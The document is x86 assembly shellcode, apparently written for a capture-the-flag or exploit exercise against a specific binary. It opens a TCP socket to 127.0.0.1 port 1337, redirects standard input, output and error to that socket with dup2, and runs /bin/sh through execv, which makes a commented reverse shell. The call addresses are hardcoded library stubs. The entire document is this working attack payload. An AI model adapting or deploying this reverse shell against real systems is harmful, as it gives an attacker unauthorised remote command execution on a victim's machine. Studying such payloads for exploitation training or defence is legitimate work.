#call _socket
SUB ESP, 512
PUSH 0x0 # protocol
PUSH 0x1 # type
PUSH 0x2 # family = AF_INET
MOV EDI, 0x08048730
CALL EDI #_socket

MOV ESI, EAX #sockfd = socket(2,1,0)


#bulid struct sockaddr
#struct sockaddr_in {
  #short            sin_family;  // e.g. AF_INET
  #unsigned short   sin_port;   // e.g. htons(1337)
  #struct in_addr   sin_addr;  //e.g. inet_addr("127.0.0.1")
#};

PUSH 0x0100007F #16777343s (in_addr) = inet_addr("127.0.0.1")
PUSH word ptr 0x3905 #14597 (serv_addr.sin_port) = htons(1337)
PUSH word ptr 0x2      #AF_INET
MOV EDI, ESP #struct sockaddr* pointer to the struct


#call _connect
PUSH 16 # sizeof(serv_addr)
PUSH EDI #struct sockaddr*
PUSH ESI #  sockfd
MOV EDI, 0x08048750
CALL EDI 


#call _dup2 for STDIN
PUSH 0x0 # STDIN_FILENO
PUSH ESI # sockfd
MOV EDI, 0x08048600
CALL EDI 


#call _dup2 for STDOUT
PUSH 0x1 # STDOUT_FILENO
PUSH ESI # sockfd
MOV EDI, 0x08048600
CALL EDI 


#call _dup2 for STDERR
PUSH 0x2 # STDERR_FILENO
PUSH ESI # sockfd
MOV EDI, 0x08048600
CALL EDI 

#run execv with /bin/sh
PUSH 0x0 #argv for execv = NULL
JMP _WANT_BIN_BASH

_BIN_BASH:
    MOV EDI, 0x080486D0
    CALL EDI # _execv


_WANT_BIN_BASH:
    CALL _BIN_BASH # push next line into the stack and calls
    .STRING "/bin/sh" #path for execv = /bin/sh











